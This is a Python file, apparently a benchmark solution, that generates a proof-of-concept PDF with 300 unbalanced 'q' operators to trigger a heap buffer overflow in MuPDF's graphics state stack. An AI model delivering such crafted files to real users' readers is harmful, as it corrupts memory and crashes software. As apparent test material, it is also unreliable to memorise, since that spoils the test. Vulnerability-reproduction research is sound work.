class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in MuPDF's graphics state stack,
        triggered by an excessive number of 'q' (save graphics state) operations
        in a PDF content stream. The default stack limit is 256. Pushing more
        than 256 states without popping them causes an out-of-bounds write.

        This PoC constructs a minimal, valid PDF containing a content stream
        with 300 'q' operations, which is sufficient to trigger the overflow.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # The payload consists of 300 'q' operators to overflow the graphics state stack.
        payload = b'q ' * 300
        
        # We build a valid PDF structure from scratch to deliver the payload.
        # This involves creating the necessary PDF objects (Catalog, Pages, Page, Stream)
        # and correctly formatting the cross-reference (xref) table and trailer.
        parts = []
        offsets = {}
        current_offset = 0

        # PDF Header
        header = b"%PDF-1.7\n"
        parts.append(header)
        current_offset += len(header)
        
        # Object 1: Catalog
        offsets[1] = current_offset
        obj1 = b"1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n"
        parts.append(obj1)
        current_offset += len(obj1)
        
        # Object 2: Pages
        offsets[2] = current_offset
        obj2 = b"2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1>>\nendobj\n"
        parts.append(obj2)
        current_offset += len(obj2)
        
        # Object 3: Page
        offsets[3] = current_offset
        obj3 = b"3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R>>\nendobj\n"
        parts.append(obj3)
        current_offset += len(obj3)
        
        # Object 4: Content Stream with payload
        offsets[4] = current_offset
        stream_header = b"<</Length %d>>" % len(payload)
        obj4 = stream_header + b"\nstream\n" + payload + b"\nendstream\nendobj\n"
        parts.append(obj4)
        current_offset += len(obj4)
        
        # Cross-Reference (XRef) Table
        xref_start_offset = current_offset
        
        xref_table = b"xref\n0 5\n"
        xref_table += b"0000000000 65535 f \n"
        xref_table += b"%010d 00000 n \n" % offsets[1]
        xref_table += b"%010d 00000 n \n" % offsets[2]
        xref_table += b"%010d 00000 n \n" % offsets[3]
        xref_table += b"%010d 00000 n \n" % offsets[4]
        parts.append(xref_table)
        
        # Trailer
        trailer = b"trailer\n<</Size 5 /Root 1 0 R>>\n"
        parts.append(trailer)
        
        # Startxref
        startxref = b"startxref\n%d\n" % xref_start_offset
        parts.append(startxref)
        
        # End-of-File marker
        eof = b"%%EOF"
        parts.append(eof)
        
        return b"".join(parts)